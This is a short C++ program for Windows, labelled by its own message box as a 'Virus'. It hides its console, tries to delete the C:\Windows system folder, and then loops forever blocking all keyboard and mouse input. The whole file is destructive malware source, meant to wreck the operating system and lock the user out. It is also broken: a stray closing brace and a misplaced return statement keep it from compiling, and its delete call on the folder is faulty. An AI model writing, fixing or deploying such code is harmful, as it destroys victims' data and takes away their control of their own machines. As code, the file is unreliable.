#include <iostream>
#include <windows.h>
#include <cstdio>

using namespace std;

int main(){
  MessageBox(NULL,"You Messed Up Hard","Virus", MB_OK); //The Message!
  FreeConsole(); //Hides Console
  
  const int result = remove("C:\Windows"); //Removes The C:/Windows Folder
  
  while(1){
    BlockInput(true); //Blocks All Input
  }
}

return 0;
}
